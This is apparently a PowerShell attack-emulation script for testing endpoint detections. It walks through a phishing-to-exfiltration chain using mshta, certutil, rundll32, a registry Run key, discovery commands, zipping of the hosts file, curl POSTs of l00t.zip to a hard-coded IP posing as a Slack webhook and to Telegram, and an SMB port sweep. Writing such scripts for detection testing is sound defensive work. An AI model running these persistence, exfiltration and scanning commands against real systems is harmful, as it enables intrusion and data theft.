# ============================================================================
#  Windows attack emulation — phishing -> execution -> persistence ->
#  exfiltration -> internal recon (mirrors the EDEN "Phishing to Recon and
#  Exfiltration" and "Cross-Platform Slack Exfiltration" narratives).
#
#  SAFE-BY-DESIGN: uses living-off-the-land binaries (mshta, certutil,
#  rundll32, curl, reg) with benign payloads. Nothing malicious actually
#  runs; the point is the LOLBin process ancestry + network beacons that
#  Elastic Defend behavioural rules + prebuilt detections alert on.
#
#  Shared IOCs with the Linux host (cross-platform correlation):
#    Slack-webhook C2 IP 35.235.244.32 | Telegram api.telegram.org | l00t.zip
# ============================================================================
$ErrorActionPreference = "Continue"
$webhook = "35.235.244.32"
$desktop = "C:\Users\Public\Desktop"
New-Item -ItemType Directory -Force -Path $desktop | Out-Null

Write-Host "[*] ===== Windows attack chain starting on $env:COMPUTERNAME ====="

# ---- Initial access: "Please find attached the resume" -> resume.exe --------
# (T1566 Phishing / T1204 User Execution). Benign EXE copy named resume.exe.
Copy-Item "C:\Windows\System32\whoami.exe" "$desktop\resume.exe" -Force

# ---- Execution via mshta launching the dropped payload (T1218.005) ----------
Start-Process "mshta.exe" -ArgumentList "javascript:close()" -WindowStyle Hidden
Start-Process "$desktop\resume.exe" -ArgumentList "/all" -WindowStyle Hidden -Wait

# ---- Defense evasion: certutil decodes a payload to recreate resume.exe -----
# (T1140 Deobfuscate/Decode; T1105 Ingress Tool Transfer)
$b64 = "C:\Users\Public\V3D6B5E7.txt"
[IO.File]::WriteAllText($b64, [Convert]::ToBase64String([IO.File]::ReadAllBytes("$desktop\resume.exe")))
certutil.exe -decode $b64 "C:\Users\Public\resume_decoded.exe" | Out-Null
certutil.exe -hashfile "$desktop\resume.exe" SHA256 | Out-Null

# ---- Proxy execution via rundll32 with a benign DLL (T1218.011) -------------
Start-Process "rundll32.exe" -ArgumentList "cdnver.dll,DllMain" -WindowStyle Hidden

# ---- Persistence: registry Run key (T1547.001) ------------------------------
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveUpd `
  /t REG_SZ /d "C:\Users\Public\resume_decoded.exe" /f | Out-Null

# ---- Discovery (T1087 / T1082 / T1016) --------------------------------------
whoami /all | Out-Null
net user | Out-Null
ipconfig /all | Out-Null
systeminfo | Out-Null

# ---- Collection + staging -> l00t.zip (T1560.001) ---------------------------
$stage = "C:\Users\Public\stage"; New-Item -ItemType Directory -Force -Path $stage | Out-Null
Copy-Item "C:\Windows\System32\drivers\etc\hosts" $stage -Force
Compress-Archive -Path $stage -DestinationPath "C:\Users\Public\l00t.zip" -Force

# ---- Exfiltration to Slack webhook + Telegram C2 (T1567 / T1071) ------------
try { curl.exe -s -X POST -F "file=@C:\Users\Public\l00t.zip" "http://$webhook/services/T00/B00/webhook" } catch {}
try { curl.exe -s "https://api.telegram.org/bot123456:FAKE/sendMessage?chat_id=1&text=win_loot_$env:COMPUTERNAME" } catch {}

# ---- Internal reconnaissance via nmap-style sweep + PowerShell recon --------
# (T1046) — powershell enumerates privileged groups, then a port sweep
powershell.exe -Command "Get-LocalGroupMember Administrators" | Out-Null
1..5 | ForEach-Object { Test-NetConnection -ComputerName "10.148.0.$_" -Port 445 -WarningAction SilentlyContinue | Out-Null }

Write-Host "[*] ===== Windows attack chain complete - check Security -> Alerts ====="
